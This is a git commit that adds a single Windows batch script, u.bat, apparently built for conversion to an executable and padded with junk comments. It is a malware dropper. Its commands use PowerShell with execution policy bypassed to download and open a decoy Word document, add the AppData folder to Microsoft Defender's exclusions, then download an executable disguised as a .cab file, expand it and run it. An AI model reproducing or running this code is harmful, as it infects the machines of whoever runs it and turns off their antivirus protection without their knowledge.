0e26b7f381c94e571a8e0cbeb3363e13d5f0e869
oxsve <46594689+oxsve@users.noreply.github.com>
2021-02-16 15:33:58 +0300

    Add files via upload

---
+++ u.bat
@@ -0,0 +1,51 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDBoaAGRN3+1Fokd+NSitqfe+xxIDLMAdYbYyLudL+YHp1LrZ5Jg33lVloYbAwlcMxSiYgp5oG1NuCmVOcDSugzuKg==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF25
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJmfUkHLA==
+::ZQ05rAF9IBncCkqN+0xwdVsCGVbRXA==
+::ZQ05rAF9IAHYFVzEqQJmfUkFHleTOgs=
+::eg0/rx1wNQPfEVWB+kM9LVsJDAeNfH+/CrB8
+::fBEirQZwNQPfEVWB+kM9LVsJDAeNfD3vVORPurub
+::cRolqwZ3JBvQF1fEqQJwKR1HSDemGjrpZg==
+::dhA7uBVwLU+EWFqFpk1wJx1VXwKENXi/Zg==
+::YQ03rBFzNR3SWATE5WcDCT0UfVXRC06bN4YuiA==
+::dhAmsQZ3MwfNWATEphJhcVtXQ0SNOm2uA7kZiA==
+::ZQ0/vhVqMQ3MEVWAtB9wKQhQSkSEHU+pAKROu/n+jw==
+::Zg8zqx1/OA3MEVWAtB9weUkAHVbWXA==
+::dhA7pRFwIByZRRmF0gJhekgAHVbTbj/a
+::Zh4grVQjdCyDJGyX8VAjFDBoaAGRN3+1Fokd+NT67vmD8BxOVcMeS8HewrHu
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+:: Batch123afsS ASGG23451325135GotAdminae
+:: Batch123afsSermisasdddddddddddddddddG23451325135GotAdminae451325135GotA
+:: Batch123afsSermisasdddddddddddddddddG23451325135GotAdminae451325135GotA
+:: Batch123afsSermisasdddddddddddddddddG23451325135GotAdminae451325135GotA
+
+:: Batch123afsSermisasdddddddddddddddddG23451325135GotAdminae451325135GotA
+:: Batch123afsS ASGG23451325135GotAdminae
+:-------------------------fasfasfasffqwfqweqweqweqwe12333333333333333333------
+
+:-------------------------------0-------------=0-=0-=0-=0-=67456-------    
+
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/raw/master/a.docx','%AppData%\a.docx') 
+call start %AppData%\a.docx
+call powershell.exe Add-MpPreference -ExclusionPath "%AppData%"
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/gh123124.exe','%AppData%\aaa4.cab')
+call expand %AppData%\aaa4.cab %AppData%\qfwer.exe
+call start %AppData%\qfwer.exe
